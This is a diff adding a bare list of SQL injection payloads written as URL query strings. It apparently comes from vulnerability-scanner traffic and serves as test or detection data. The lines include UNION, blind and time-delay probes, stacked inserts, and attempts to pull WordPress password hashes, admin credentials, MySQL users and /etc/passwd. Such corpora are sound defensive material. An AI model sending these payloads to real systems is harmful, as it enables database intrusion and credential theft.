@@ -1,0 +1,37 @@
+/index.asp?ID='+convert(int,convert(varchar,0x7b5d))+'
+/index.asp?ID='+cASt(somefield as int)+'
+/index.asp?ID=1'+139+'0
+/index.asp?ID='+139+'0
+/index.php?blah=123'/*blooblah*/;select * from something;--
+/index.cfm?ID=3%' and '%'='
+/index.php?mac=\" OR whatever LIKE \"%
+/index.cfm?ID=3;declare @d int;--
+/index.cfm?subjID=12;create table t_jiaozhu(jiaozhu varchar(200))
+/index.cfm?subjID=12%' and(char(94)+user+char(94))>0 and '%'='
+/index.cgi?cgi_state=view&ARF_ID=1+(642*truncate(log10(10),0))
+/index.cgi?view=1 regexp IF((ascii(substring(version(),6,1))>>(0)&1),char(42),1) AND 1=1
+/index.cfm?News=203 and char(124)+db_name()+char(124)=0 --
+/index.php?action=&type=view&s=&id=-1' UNION SELECT 0,252381211,0,0,0,0,0/*
+/index.php?x=browse&category='UNION SELECT '1','2','pixelpost_category_sql_injection.nasl','1183412908','5'/*
+/index.php?id='UNION/**/SELECT/**/0,0,1648909705,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0/*
+/index.php?id=-1/**/UNION/**/ALL/**/SELECT/**/1,0x7430705038755A7A20616E64207870726F67206F776E616765,convert(concat((SELECT/**/svalue/**/from/**/sconfig/**/where/**/soption=0x61646D696E5F6E616D65),0x3a,(SELECT/**/svalue/**/from/**/sconfig/**/where/**/soption=0x61646D696E5F70617373))/**/using/**/latin1),4,5,6,7,8,9/*
+/index.jsp?arfID=5 AND ascii(lower(substring((SELECT TOP 1 name from sysobjects WHERE xtype=âUâ), 1,1)))>109
+/?main_menu=10&sub_menu=2&id=-1 union select aes_decrypt(aes_encrypt(LOAD_FILE('/etc/passwd'),0x70),0x70)/*
+/index.asp?file=50' and 1=1 and ''='
+/index.php?cat=999 UNION SELECT null,CONCAT(666,CHAR(58),user_pass,CHAR(58),666,CHAR(58)),null,null,null FROM wp_users where id=1/*
+/index.asp?authornumber=1);insert into SubjectTable(Sub_id, SubjectName, display) values (666, 'ChkQualysRprt', 1); --
+/index.php?ID=60 and (select unicode(substring(isNull(cast(db_name() as varchar(8000)),char(32)),29,1)))
+/index.php?sort=all&&active=NO' union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0/* and '1'='1
+/index.php?sort=all&&active=no' and 1=2 union select 1,'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/* and '1'='1
+/index.php?sort=all&&active=no' and (select count(table_name) from user_tables)>0 and '1'='1
+/index.php?id=22 /*!49999 and 1=2*/-- and 1=1
+/index.php?ID=59 and (select count(table_name) from user_tables)>0 and 1=1
+/index.php?ID=60 and exists (select * from [news])
+/index.asp?ARF_ID=(1/(1-(asc(mid(now(),18,1))\(2^7) mod 2)))
+/index.php' and 1=convert(int,(select top 1 table_name from information_schema.tables))--sp_password
+/index.php?id=873 and user=0--
+?id=1;+if+(1=1)+waitfor+delay+'00:00:01'--9
+?id=1+and+if(1=1,BENCHMARK(728000,MD5(0x41)),0)9
+/index.asp?id=100&arftype=46'	XoR	'8'='8
+after=1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')&before=d
+hUserId=22768&FromDate=1&ToDate=1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-&sendbutton1=Get+Statement
